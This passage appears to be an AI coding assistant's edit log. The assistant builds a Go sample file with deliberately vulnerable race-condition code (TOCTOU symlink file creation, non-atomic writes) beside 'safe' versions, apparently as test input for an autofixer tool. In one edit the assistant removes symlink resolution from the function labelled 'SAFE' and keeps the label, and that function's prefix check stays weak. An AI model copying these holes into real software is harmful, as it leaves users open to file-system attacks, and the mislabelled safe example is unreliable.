          "result": "{"contents":"package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"sync\\"\\n\\t\\"time\\"\\n)\\n\\n// VULNERABLE: Time-of-check to time-of-use (TOCTOU) race condition\\nfunc createFileUnsafe(filename string) error {\\n\\t// UNSAFE: Check and use are not atomic\\n\\t// Between check and open, attacker can create symlink to sensitive file\\n\\tif _, err := os.Stat(filename); os.IsNotExist(err) {\\n\\t\\t// Race condition window here!\\n\\t\\tfile, err := os.Create(filename)\\n\\t\\tif err != nil {\\n\\t\\t\\treturn err\\n\\t\\t}\\n\\t\\tfile.Close()\\n\\t}\\n\\treturn nil\\n}\\n\\n// VULNERABLE: Non-atomic file operations\\nfunc writeToFileUnsafe(filename string, data []byte) error {\\n\\t// UNSAFE: Multiple non-atomic operations allow race conditions\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// UNSAFE: Another process could modify file between open and write\\n\\ttime.Sleep(10 * time.Millisecond) // Simulating some processing time\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// VULNERABLE: Unsafe concurrent access without synchronization\\nvar globalCounter int\\n\\nfunc incrementUnsafe() {\\n\\t// UNSAFE: Read-modify-write is not atomic\\n\\tglobalCounter++ // This is actually three operations: read, modify, write\\n}\\n\\nfunc incrementUnsafeDetailed() {\\n\\t// UNSAFE: Explicitly showing the non-atomic operations\\n\\tval := globalCounter // Read\\n\\tval++                // Modify\\n\\tglobalCounter = val  // Write\\n\\t// Another goroutine can interleave between these operations\\n}\\n\\n// SAFE: Using O_EXCL flag for atomic file creation\\nfunc createFileSafe(filename string) error {\\n\\t// SAFE: O_EXCL ensures file creation and existence check are atomic\\n\\tfile, err := os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)\\n\\tif err != nil {\\n\\t\\tif os.IsExist(err) {\\n\\t\\t\\treturn fmt.Errorf(\\"file already exists\\")\\n\\t\\t}\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\treturn nil\\n}\\n\\n// SAFE: Using file locks for atomic operations\\nfunc writeToFileSafe(filename string, data []byte) error {\\n\\t// SAFE: Open with exclusive lock\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// SAFE: Lock file for exclusive access\\n\\terr = syscall.Flock(int(file.Fd()), syscall.LOCK_EX)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer syscall.Flock(int(file.Fd()), syscall.LOCK_UN)\\n\\n\\t// SAFE: Now write is protected from concurrent access\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// SAFE: Using mutex for synchronized access\\nvar (\\n\\tglobalCounterSafe int\\n\\tcounterMutex     sync.Mutex\\n)\\n\\nfunc incrementSafe() {\\n\\t// SAFE: Mutex ensures read-modify-write is atomic\\n\\tcounterMutex.Lock()\\n\\tdefer counterMutex.Unlock()\\n\\tglobalCounterSafe++\\n}\\n\\n// SAFE: Using atomic operations for simple increments\\nimport \\"sync/atomic\\"\\n\\nvar globalCounterAtomic int64\\n\\nfunc incrementAtomic() {\\n\\t// SAFE: Atomic increment is guaranteed to be thread-safe\\n\\tatomic.AddInt64(&globalCounterAtomic, 1)\\n}\\n\\nfunc getCounterAtomic() int64 {\\n\\t// SAFE: Atomic read ensures we get consistent value\\n\\treturn atomic.LoadInt64(&globalCounterAtomic)\\n}\\n\\n// SAFE: Using channels for safe concurrent communication\\nfunc processWithChannel(items []int) {\\n\\t// SAFE: Channel provides safe synchronization\\n\\tresults := make(chan int, len(items))\\n\\t\\n\\tvar wg sync.WaitGroup\\n\\tfor _, item := range items {\\n\\t\\twg.Add(1)\\n\\t\\tgo func(val int) {\\n\\t\\t\\tdefer wg.Done()\\n\\t\\t\\t// Process item\\n\\t\\t\\tresult := val * 2\\n\\t\\t\\tresults <- result\\n\\t\\t}(item)\\n\\t}\\n\\t\\n\\tgo func() {\\n\\t\\twg.Wait()\\n\\t\\tclose(results)\\n\\t}()\\n\\t\\n\\t// Collect results safely\\n\\tfor result := range results {\\n\\t\\tfmt.Println(result)\\n\\t}\\n}\\n\\n// SAFE: Validating file path before use\\nfunc validateAndUseFile(filepath string) error {\\n\\t// SAFE: Resolve symlinks and validate path\\n\\trealPath, err := filepath.EvalSymlinks(filepath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\t// SAFE: Verify path is within allowed directory\\n\\tallowedDir := \\"/safe/directory\\"\\n\\tabsRealPath, _ := filepath.Abs(realPath)\\n\\tabsAllowed, _ := filepath.Abs(allowedDir)\\n\\t\\n\\tif !strings.HasPrefix(absRealPath, absAllowed) {\\n\\t\\treturn fmt.Errorf(\\"path outside allowed directory\\")\\n\\t}\\n\\t\\n\\t// SAFE: Now use the validated path\\n\\tfile, err := os.Open(absRealPath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\t\\n\\treturn nil\\n}\\n","numCharactersInRequestedRange":4138,"totalLinesInFile":173}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:26.747Z,
        "text": "Fixing missing imports and code issues:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:26.839Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "search_replace",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_race_condition.go"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_race_condition.go", "old_string": "package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"sync\\"\\n\\t\\"time\\"\\n)", "new_string": "package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"strings\\"\\n\\t\\"sync\\"\\n\\t\\"sync/atomic\\"\\n\\t\\"syscall\\"\\n\\t\\"time\\"\\n)"}",
          "result": "{"diff":{"chunks":[{"diffString":"  \\t\\"os\\"\\n  \\t\\"path/filepath\\"\\n+ \\t\\"strings\\"\\n  \\t\\"sync\\"\\n+ \\t\\"sync/atomic\\"\\n+ \\t\\"syscall\\"\\n  \\t\\"time\\"\\n  )","oldStart":5,"newStart":5,"oldLines":5,"newLines":8,"linesAdded":3}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"The file /Users/jonathanafek/src/autofixer/sample_race_condition.go has been updated. Here's a relevant snippet of the edited file:\\n\\n     1|package main\\n     2|\\n     3|import (\\n     4|\\t\\"fmt\\"\\n     5|\\t\\"os\\"\\n     6|\\t\\"path/filepath\\"\\n     7|\\t\\"strings\\"\\n     8|\\t\\"sync\\"\\n     9|\\t\\"sync/atomic\\"\\n    10|\\t\\"syscall\\"\\n    11|\\t\\"time\\"\\n    12|)\\n    13|\\n    14|// VULNERABLE: Time-of-check to time-of-use (TOCTOU) race condition\\n    15|func createFileUnsafe(filename string) error {\\n    16|\\t// UNSAFE: Check and use are not atomic\\n    17|\\t// Between check and open, attacker can create symlink to sensitive file","contentsAfterEdit":"package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"strings\\"\\n\\t\\"sync\\"\\n\\t\\"sync/atomic\\"\\n\\t\\"syscall\\"\\n\\t\\"time\\"\\n)\\n\\n// VULNERABLE: Time-of-check to time-of-use (TOCTOU) race condition\\nfunc createFileUnsafe(filename string) error {\\n\\t// UNSAFE: Check and use are not atomic\\n\\t// Between check and open, attacker can create symlink to sensitive file\\n\\tif _, err := os.Stat(filename); os.IsNotExist(err) {\\n\\t\\t// Race condition window here!\\n\\t\\tfile, err := os.Create(filename)\\n\\t\\tif err != nil {\\n\\t\\t\\treturn err\\n\\t\\t}\\n\\t\\tfile.Close()\\n\\t}\\n\\treturn nil\\n}\\n\\n// VULNERABLE: Non-atomic file operations\\nfunc writeToFileUnsafe(filename string, data []byte) error {\\n\\t// UNSAFE: Multiple non-atomic operations allow race conditions\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// UNSAFE: Another process could modify file between open and write\\n\\ttime.Sleep(10 * time.Millisecond) // Simulating some processing time\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// VULNERABLE: Unsafe concurrent access without synchronization\\nvar globalCounter int\\n\\nfunc incrementUnsafe() {\\n\\t// UNSAFE: Read-modify-write is not atomic\\n\\tglobalCounter++ // This is actually three operations: read, modify, write\\n}\\n\\nfunc incrementUnsafeDetailed() {\\n\\t// UNSAFE: Explicitly showing the non-atomic operations\\n\\tval := globalCounter // Read\\n\\tval++                // Modify\\n\\tglobalCounter = val  // Write\\n\\t// Another goroutine can interleave between these operations\\n}\\n\\n// SAFE: Using O_EXCL flag for atomic file creation\\nfunc createFileSafe(filename string) error {\\n\\t// SAFE: O_EXCL ensures file creation and existence check are atomic\\n\\tfile, err := os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)\\n\\tif err != nil {\\n\\t\\tif os.IsExist(err) {\\n\\t\\t\\treturn fmt.Errorf(\\"file already exists\\")\\n\\t\\t}\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\treturn nil\\n}\\n\\n// SAFE: Using file locks for atomic operations\\nfunc writeToFileSafe(filename string, data []byte) error {\\n\\t// SAFE: Open with exclusive lock\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// SAFE: Lock file for exclusive access\\n\\terr = syscall.Flock(int(file.Fd()), syscall.LOCK_EX)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer syscall.Flock(int(file.Fd()), syscall.LOCK_UN)\\n\\n\\t// SAFE: Now write is protected from concurrent access\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// SAFE: Using mutex for synchronized access\\nvar (\\n\\tglobalCounterSafe int\\n\\tcounterMutex     sync.Mutex\\n)\\n\\nfunc incrementSafe() {\\n\\t// SAFE: Mutex ensures read-modify-write is atomic\\n\\tcounterMutex.Lock()\\n\\tdefer counterMutex.Unlock()\\n\\tglobalCounterSafe++\\n}\\n\\n// SAFE: Using atomic operations for simple increments\\nimport \\"sync/atomic\\"\\n\\nvar globalCounterAtomic int64\\n\\nfunc incrementAtomic() {\\n\\t// SAFE: Atomic increment is guaranteed to be thread-safe\\n\\tatomic.AddInt64(&globalCounterAtomic, 1)\\n}\\n\\nfunc getCounterAtomic() int64 {\\n\\t// SAFE: Atomic read ensures we get consistent value\\n\\treturn atomic.LoadInt64(&globalCounterAtomic)\\n}\\n\\n// SAFE: Using channels for safe concurrent communication\\nfunc processWithChannel(items []int) {\\n\\t// SAFE: Channel provides safe synchronization\\n\\tresults := make(chan int, len(items))\\n\\t\\n\\tvar wg sync.WaitGroup\\n\\tfor _, item := range items {\\n\\t\\twg.Add(1)\\n\\t\\tgo func(val int) {\\n\\t\\t\\tdefer wg.Done()\\n\\t\\t\\t// Process item\\n\\t\\t\\tresult := val * 2\\n\\t\\t\\tresults <- result\\n\\t\\t}(item)\\n\\t}\\n\\t\\n\\tgo func() {\\n\\t\\twg.Wait()\\n\\t\\tclose(results)\\n\\t}()\\n\\t\\n\\t// Collect results safely\\n\\tfor result := range results {\\n\\t\\tfmt.Println(result)\\n\\t}\\n}\\n\\n// SAFE: Validating file path before use\\nfunc validateAndUseFile(filepath string) error {\\n\\t// SAFE: Resolve symlinks and validate path\\n\\trealPath, err := filepath.EvalSymlinks(filepath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\t// SAFE: Verify path is within allowed directory\\n\\tallowedDir := \\"/safe/directory\\"\\n\\tabsRealPath, _ := filepath.Abs(realPath)\\n\\tabsAllowed, _ := filepath.Abs(allowedDir)\\n\\t\\n\\tif !strings.HasPrefix(absRealPath, absAllowed) {\\n\\t\\treturn fmt.Errorf(\\"path outside allowed directory\\")\\n\\t}\\n\\t\\n\\t// SAFE: Now use the validated path\\n\\tfile, err := os.Open(absRealPath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\t\\n\\treturn nil\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:26.839Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "search_replace",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_race_condition.go"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_race_condition.go", "old_string": "\\tglobalCounterSafe++\\n}\\n\\n// SAFE: Using atomic operations for simple increments\\nimport \\"sync/atomic\\"\\n\\nvar globalCounterAtomic int64", "new_string": "\\tglobalCounterSafe++\\n}\\n\\n// SAFE: Using atomic operations for simple increments\\nvar globalCounterAtomic int64"}",
          "result": "{"diff":{"chunks":[{"diffString":"  \\n  // SAFE: Using atomic operations for simple increments\\n- import \\"sync/atomic\\"\\n- \\n  var globalCounterAtomic int64\\n  ","oldStart":107,"newStart":107,"oldLines":6,"newLines":4,"linesRemoved":2}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"The file /Users/jonathanafek/src/autofixer/sample_race_condition.go has been updated. Here's a relevant snippet of the edited file:\\n\\n   100|\\n   101|func incrementSafe() {\\n   102|\\t// SAFE: Mutex ensures read-modify-write is atomic\\n   103|\\tcounterMutex.Lock()\\n   104|\\tdefer counterMutex.Unlock()\\n   105|\\tglobalCounterSafe++\\n   106|}\\n   107|\\n   108|// SAFE: Using atomic operations for simple increments\\n   109|var globalCounterAtomic int64\\n   110|\\n   111|func incrementAtomic() {\\n   112|\\t// SAFE: Atomic increment is guaranteed to be thread-safe\\n   113|\\tatomic.AddInt64(&globalCounterAtomic, 1)\\n   114|}","contentsAfterEdit":"package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"strings\\"\\n\\t\\"sync\\"\\n\\t\\"sync/atomic\\"\\n\\t\\"syscall\\"\\n\\t\\"time\\"\\n)\\n\\n// VULNERABLE: Time-of-check to time-of-use (TOCTOU) race condition\\nfunc createFileUnsafe(filename string) error {\\n\\t// UNSAFE: Check and use are not atomic\\n\\t// Between check and open, attacker can create symlink to sensitive file\\n\\tif _, err := os.Stat(filename); os.IsNotExist(err) {\\n\\t\\t// Race condition window here!\\n\\t\\tfile, err := os.Create(filename)\\n\\t\\tif err != nil {\\n\\t\\t\\treturn err\\n\\t\\t}\\n\\t\\tfile.Close()\\n\\t}\\n\\treturn nil\\n}\\n\\n// VULNERABLE: Non-atomic file operations\\nfunc writeToFileUnsafe(filename string, data []byte) error {\\n\\t// UNSAFE: Multiple non-atomic operations allow race conditions\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// UNSAFE: Another process could modify file between open and write\\n\\ttime.Sleep(10 * time.Millisecond) // Simulating some processing time\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// VULNERABLE: Unsafe concurrent access without synchronization\\nvar globalCounter int\\n\\nfunc incrementUnsafe() {\\n\\t// UNSAFE: Read-modify-write is not atomic\\n\\tglobalCounter++ // This is actually three operations: read, modify, write\\n}\\n\\nfunc incrementUnsafeDetailed() {\\n\\t// UNSAFE: Explicitly showing the non-atomic operations\\n\\tval := globalCounter // Read\\n\\tval++                // Modify\\n\\tglobalCounter = val  // Write\\n\\t// Another goroutine can interleave between these operations\\n}\\n\\n// SAFE: Using O_EXCL flag for atomic file creation\\nfunc createFileSafe(filename string) error {\\n\\t// SAFE: O_EXCL ensures file creation and existence check are atomic\\n\\tfile, err := os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)\\n\\tif err != nil {\\n\\t\\tif os.IsExist(err) {\\n\\t\\t\\treturn fmt.Errorf(\\"file already exists\\")\\n\\t\\t}\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\treturn nil\\n}\\n\\n// SAFE: Using file locks for atomic operations\\nfunc writeToFileSafe(filename string, data []byte) error {\\n\\t// SAFE: Open with exclusive lock\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// SAFE: Lock file for exclusive access\\n\\terr = syscall.Flock(int(file.Fd()), syscall.LOCK_EX)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer syscall.Flock(int(file.Fd()), syscall.LOCK_UN)\\n\\n\\t// SAFE: Now write is protected from concurrent access\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// SAFE: Using mutex for synchronized access\\nvar (\\n\\tglobalCounterSafe int\\n\\tcounterMutex     sync.Mutex\\n)\\n\\nfunc incrementSafe() {\\n\\t// SAFE: Mutex ensures read-modify-write is atomic\\n\\tcounterMutex.Lock()\\n\\tdefer counterMutex.Unlock()\\n\\tglobalCounterSafe++\\n}\\n\\n// SAFE: Using atomic operations for simple increments\\nvar globalCounterAtomic int64\\n\\nfunc incrementAtomic() {\\n\\t// SAFE: Atomic increment is guaranteed to be thread-safe\\n\\tatomic.AddInt64(&globalCounterAtomic, 1)\\n}\\n\\nfunc getCounterAtomic() int64 {\\n\\t// SAFE: Atomic read ensures we get consistent value\\n\\treturn atomic.LoadInt64(&globalCounterAtomic)\\n}\\n\\n// SAFE: Using channels for safe concurrent communication\\nfunc processWithChannel(items []int) {\\n\\t// SAFE: Channel provides safe synchronization\\n\\tresults := make(chan int, len(items))\\n\\t\\n\\tvar wg sync.WaitGroup\\n\\tfor _, item := range items {\\n\\t\\twg.Add(1)\\n\\t\\tgo func(val int) {\\n\\t\\t\\tdefer wg.Done()\\n\\t\\t\\t// Process item\\n\\t\\t\\tresult := val * 2\\n\\t\\t\\tresults <- result\\n\\t\\t}(item)\\n\\t}\\n\\t\\n\\tgo func() {\\n\\t\\twg.Wait()\\n\\t\\tclose(results)\\n\\t}()\\n\\t\\n\\t// Collect results safely\\n\\tfor result := range results {\\n\\t\\tfmt.Println(result)\\n\\t}\\n}\\n\\n// SAFE: Validating file path before use\\nfunc validateAndUseFile(filepath string) error {\\n\\t// SAFE: Resolve symlinks and validate path\\n\\trealPath, err := filepath.EvalSymlinks(filepath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\t// SAFE: Verify path is within allowed directory\\n\\tallowedDir := \\"/safe/directory\\"\\n\\tabsRealPath, _ := filepath.Abs(realPath)\\n\\tabsAllowed, _ := filepath.Abs(allowedDir)\\n\\t\\n\\tif !strings.HasPrefix(absRealPath, absAllowed) {\\n\\t\\treturn fmt.Errorf(\\"path outside allowed directory\\")\\n\\t}\\n\\t\\n\\t// SAFE: Now use the validated path\\n\\tfile, err := os.Open(absRealPath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\t\\n\\treturn nil\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:28.533Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "search_replace",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_race_condition.go"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_race_condition.go", "old_string": "// SAFE: Validating file path before use\\nfunc validateAndUseFile(filepath string) error {\\n\\t// SAFE: Resolve symlinks and validate path\\n\\trealPath, err := filepath.EvalSymlinks(filepath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\t// SAFE: Verify path is within allowed directory\\n\\tallowedDir := \\"/safe/directory\\"\\n\\tabsRealPath, _ := filepath.Abs(realPath)\\n\\tabsAllowed, _ := filepath.Abs(allowedDir)", "new_string": "// SAFE: Validating file path before use\\nfunc validateAndUseFile(filepathStr string) error {\\n\\t// SAFE: Resolve to absolute path and validate\\n\\tabsRealPath, err := filepath.Abs(filepathStr)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\t// SAFE: Verify path is within allowed directory\\n\\tallowedDir := \\"/safe/directory\\"\\n\\tabsAllowed, err := filepath.Abs(allowedDir)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}"}",
          "result": "{"diff":{"chunks":[{"diffString":"  \\n  // SAFE: Validating file path before use\\n- func validateAndUseFile(filepath string) error {\\n- \\t// SAFE: Resolve symlinks and validate path\\n- \\trealPath, err := filepath.EvalSymlinks(filepath)\\n+ func validateAndUseFile(filepathStr string) error {\\n+ \\t// SAFE: Resolve to absolute path and validate\\n+ \\tabsRealPath, err := filepath.Abs(filepathStr)\\n  \\tif err != nil {\\n  \\t\\treturn err","oldStart":147,"newStart":147,"oldLines":7,"newLines":7,"linesRemoved":3,"linesAdded":3},{"diffString":"  \\t// SAFE: Verify path is within allowed directory\\n  \\tallowedDir := \\"/safe/directory\\"\\n- \\tabsRealPath, _ := filepath.Abs(realPath)\\n- \\tabsAllowed, _ := filepath.Abs(allowedDir)\\n+ \\tabsAllowed, err := filepath.Abs(allowedDir)\\n+ \\tif err != nil {\\n+ \\t\\treturn err\\n+ \\t}\\n  \\t\\n  \\tif !strings.HasPrefix(absRealPath, absAllowed) {","oldStart":156,"newStart":156,"oldLines":6,"newLines":8,"linesRemoved":2,"linesAdded":4}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"The file /Users/jonathanafek/src/autofixer/sample_race_condition.go has been updated. Here's a relevant snippet of the edited file:\\n\\n   143|\\tfor result := range results {\\n   144|\\t\\tfmt.Println(result)\\n   145|\\t}\\n   146|}\\n   147|\\n   148|// SAFE: Validating file path before use\\n   149|func validateAndUseFile(filepathStr string) error {\\n   150|\\t// SAFE: Resolve to absolute path and validate\\n   151|\\tabsRealPath, err := filepath.Abs(filepathStr)\\n   152|\\tif err != nil {\\n   153|\\t\\treturn err\\n   154|\\t}\\n   155|\\t\\n   156|\\t// SAFE: Verify path is within allowed directory\\n   157|\\tallowedDir := \\"/safe/directory\\"\\n   158|\\tabsAllowed, err := filepath.Abs(allowedDir)\\n   159|\\tif err != nil {\\n   160|\\t\\treturn err\\n   161|\\t}\\n   162|\\t\\n   163|\\tif !strings.HasPrefix(absRealPath, absAllowed) {\\n   164|\\t\\treturn fmt.Errorf(\\"path outside allowed directory\\")\\n   165|\\t}\\n   166|\\t","contentsAfterEdit":"package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"strings\\"\\n\\t\\"sync\\"\\n\\t\\"sync/atomic\\"\\n\\t\\"syscall\\"\\n\\t\\"time\\"\\n)\\n\\n// VULNERABLE: Time-of-check to time-of-use (TOCTOU) race condition\\nfunc createFileUnsafe(filename string) error {\\n\\t// UNSAFE: Check and use are not atomic\\n\\t// Between check and open, attacker can create symlink to sensitive file\\n\\tif _, err := os.Stat(filename); os.IsNotExist(err) {\\n\\t\\t// Race condition window here!\\n\\t\\tfile, err := os.Create(filename)\\n\\t\\tif err != nil {\\n\\t\\t\\treturn err\\n\\t\\t}\\n\\t\\tfile.Close()\\n\\t}\\n\\treturn nil\\n}\\n\\n// VULNERABLE: Non-atomic file operations\\nfunc writeToFileUnsafe(filename string, data []byte) error {\\n\\t// UNSAFE: Multiple non-atomic operations allow race conditions\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// UNSAFE: Another process could modify file between open and write\\n\\ttime.Sleep(10 * time.Millisecond) // Simulating some processing time\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// VULNERABLE: Unsafe concurrent access without synchronization\\nvar globalCounter int\\n\\nfunc incrementUnsafe() {\\n\\t// UNSAFE: Read-modify-write is not atomic\\n\\tglobalCounter++ // This is actually three operations: read, modify, write\\n}\\n\\nfunc incrementUnsafeDetailed() {\\n\\t// UNSAFE: Explicitly showing the non-atomic operations\\n\\tval := globalCounter // Read\\n\\tval++                // Modify\\n\\tglobalCounter = val  // Write\\n\\t// Another goroutine can interleave between these operations\\n}\\n\\n// SAFE: Using O_EXCL flag for atomic file creation\\nfunc createFileSafe(filename string) error {\\n\\t// SAFE: O_EXCL ensures file creation and existence check are atomic\\n\\tfile, err := os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)\\n\\tif err != nil {\\n\\t\\tif os.IsExist(err) {\\n\\t\\t\\treturn fmt.Errorf(\\"file already exists\\")\\n\\t\\t}\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\treturn nil\\n}\\n\\n// SAFE: Using file locks for atomic operations\\nfunc writeToFileSafe(filename string, data []byte) error {\\n\\t// SAFE: Open with exclusive lock\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// SAFE: Lock file for exclusive access\\n\\terr = syscall.Flock(int(file.Fd()), syscall.LOCK_EX)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer syscall.Flock(int(file.Fd()), syscall.LOCK_UN)\\n\\n\\t// SAFE: Now write is protected from concurrent access\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// SAFE: Using mutex for synchronized access\\nvar (\\n\\tglobalCounterSafe int\\n\\tcounterMutex     sync.Mutex\\n)\\n\\nfunc incrementSafe() {\\n\\t// SAFE: Mutex ensures read-modify-write is atomic\\n\\tcounterMutex.Lock()\\n\\tdefer counterMutex.Unlock()\\n\\tglobalCounterSafe++\\n}\\n\\n// SAFE: Using atomic operations for simple increments\\nvar globalCounterAtomic int64\\n\\nfunc incrementAtomic() {\\n\\t// SAFE: Atomic increment is guaranteed to be thread-safe\\n\\tatomic.AddInt64(&globalCounterAtomic, 1)\\n}\\n\\nfunc getCounterAtomic() int64 {\\n\\t// SAFE: Atomic read ensures we get consistent value\\n\\treturn atomic.LoadInt64(&globalCounterAtomic)\\n}\\n\\n// SAFE: Using channels for safe concurrent communication\\nfunc processWithChannel(items []int) {\\n\\t// SAFE: Channel provides safe synchronization\\n\\tresults := make(chan int, len(items))\\n\\t\\n\\tvar wg sync.WaitGroup\\n\\tfor _, item := range items {\\n\\t\\twg.Add(1)\\n\\t\\tgo func(val int) {\\n\\t\\t\\tdefer wg.Done()\\n\\t\\t\\t// Process item\\n\\t\\t\\tresult := val * 2\\n\\t\\t\\tresults <- result\\n\\t\\t}(item)\\n\\t}\\n\\t\\n\\tgo func() {\\n\\t\\twg.Wait()\\n\\t\\tclose(results)\\n\\t}()\\n\\t\\n\\t// Collect results safely\\n\\tfor result := range results {\\n\\t\\tfmt.Println(result)\\n\\t}\\n}\\n\\n// SAFE: Validating file path before use\\nfunc validateAndUseFile(filepathStr string) error {\\n\\t// SAFE: Resolve to absolute path and validate\\n\\tabsRealPath, err := filepath.Abs(filepathStr)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\t// SAFE: Verify path is within allowed directory\\n\\tallowedDir := \\"/safe/directory\\"\\n\\tabsAllowed, err := filepath.Abs(allowedDir)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\tif !strings.HasPrefix(absRealPath, absAllowed) {\\n\\t\\treturn fmt.Errorf(\\"path outside allowed directory\\")\\n\\t}\\n\\t\\n\\t// SAFE: Now use the validated path\\n\\tfile, err := os.Open(absRealPath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\t\\n\\treturn nil\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:37.010Z,
        "text": "Re-running lint checks:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:37.057Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_race_condition.go","sample_ssrf_vulnerable.py"]}",
          "rawArguments": "{"paths": ["sample_race_condition.go","sample_ssrf_vulnerable.py"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:42.361Z,
        "text": "Created 2 sample code files:

